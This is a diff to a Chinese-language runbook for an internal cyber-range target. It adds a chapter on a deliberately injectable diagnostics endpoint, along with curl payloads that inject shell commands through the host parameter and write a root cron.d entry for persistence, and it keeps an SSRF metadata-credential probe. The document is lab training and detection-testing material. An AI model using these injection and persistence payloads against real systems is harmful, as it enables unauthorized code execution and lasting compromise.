@@ -1,9 +1,10 @@
-# Runbook —— 靶機真攻擊鏈（票 #44 / #45 / #46；CH2/CH3 見 #153）
+# Runbook —— 靶機真攻擊鏈（票 #44 / #45 / #46；CH2/CH3/CH4 見 #153）
 
 單機縱深攻擊鏈：**HTTP SQLi → 撈 dbadmin 帳密 → 直連 :3306 → 讀 flag**（CH1）。
 本檔是操作與驗收手冊；結構契約由 `tests/deploy/test_target_attack_surface.py`（T1，在 CI）證，
 真打進去／真拿 flag／真重烤由下方 T4 在大主機證。CH2（校園海報上傳 → Web Shell →
-本機提權）與 CH3（網址預覽 SSRF → metadata 憑證竊取 → API pivot）見本檔下方獨立段落。
+本機提權）、CH3（網址預覽 SSRF → metadata 憑證竊取 → API pivot）與 CH4（報修
+診斷工具指令注入 → cron 持久化）見本檔下方獨立段落。
 
 ## 操作規則（先讀這條）
 
@@ -224,6 +225,68 @@ curl -s -o /dev/null -w '%{http_code}\n' "http://10.167.20.10/internal/reports"
 # 而不是拿到回應——證明「唯一入口是 SSRF」這件事，不是靶機防火牆規則造成的假象）
 curl -s -m 3 "http://10.167.20.10:8169/latest/meta-data/iam/security-credentials/" || echo "連不到（預期行為）"
 ```
+
+---
+
+# CH4 Ghost in the System —— 校園報修診斷工具（#153 Campaign Pack v1）
+
+單機縱深攻擊鏈：**報修診斷工具把主機名直接組進 shell 指令 → 用 `;` 等字元斷句
+注入任意指令 → 用同一個注入點把排程寫進 cron.d，讓存取跨 session 存活**。四條
+新章節裡**唯一會留下跨 session 持久化狀態**的一條，`reset_scope=environment`。
+結構契約與**真攻擊鏈本身**都由 `tests/deploy/test_range_target_command_injection.py`
+（真 HTTP round-trip，不需要 VM，在 CI）證。
+
+## 二分：可計分 vs fixture
+
+| 端點 | 類別 | 說明 |
+|---|---|---|
+| `/diagnostics/lookup` | **可計分**（#153 CH4） | 真指令注入，紅隊要真的打 |
+| `/exec` `/readsecret` `/uncovered` `/healthz`、`/poster/*`、`/preview` `/internal/reports` | fixture / CH2 / CH3 | 與既有章節共用，行為不變；`/diagnostics/lookup` 與 `/exec` **不共用任何程式碼路徑**（`/exec` 是固定 marker fixture，不吃使用者輸入） |
+
+## 攻擊面的信任邊界（為什麼「幫你檢查主機名」很危險）
+
+- `/diagnostics/lookup?host=<raw>` 把 `<raw>` 直接組進 `sh -c "echo checking <raw>"`
+  —— 沒有跳脫、沒有白名單。正常主機名（純字串）只會跑到 `sh` 內建的 `echo`，
+  不會 fork 出任何子行程；一旦帶 `;` `|` `` ` `` `$(` 等 shell 特殊字元斷句，
+  就是任意指令執行。
+- 拿到指令執行後，攻擊者可以用**同一個注入點**把持久化寫進
+  `/etc/cron.d/campus-report`。這個路徑正常情況下永遠不存在——`PurpleScope Cron
+  Persistence Write` 這條 Falco 規則只要看到任何一次 open 就值得注意。
+
+## 真環境操作
+
+```bash
+# 第一跳：確認注入點成立（marker 只有真的執行到注入指令才會出現）
+curl -s "http://10.167.20.10/diagnostics/lookup?host=mit.edu%3B%20echo%20PWNED"
+#   → checking mit.edu\nPWNED
+
+# 第二跳：用同一個注入點把持久化寫進 cron.d
+curl -s "http://10.167.20.10/diagnostics/lookup?host=mit.edu%3B%20echo%20'*%20*%20*%20*%20*%20root%20touch%20/var/lib/purplescope/campus-persist-marker'%20%3E%20/etc/cron.d/campus-report"
+
+# 驗收：cron.d 檔案真的存在
+cat /etc/cron.d/campus-report
+#   → * * * * * root touch /var/lib/purplescope/campus-persist-marker
+```
+
+## 負向驗收
+
+```bash
+# 正常主機名：只回 echo 結果，不該有任何額外輸出
+curl -s "http://10.167.20.10/diagnostics/lookup?host=mit.edu"
+#   → checking mit.edu
+
+# 缺 host 參數：400
+curl -s -o /dev/null -w '%{http_code}\n' "http://10.167.20.10/diagnostics/lookup"
+#   → 400
+```
+
+## T4 侷限說明
+
+golden VM 是否確實安裝了 cron daemon（Ubuntu cloud image 通常內建，`bake.sh` 未
+額外 `apt-get install cron`）未在 bake 期驗證。本章的偵測/計分邏輯只依賴「持久化
+檔案被寫入」這個可觀測狀態，即使 cron daemon 缺席也不影響；但「持久化真的在
+重開機後觸發」這個敘事宣稱需要 T4 上機驗證（`systemctl status cron` +
+實際等一個 cron tick 確認 marker 檔案出現）。
 
 ## T3 —— range 契約（防火牆）
 
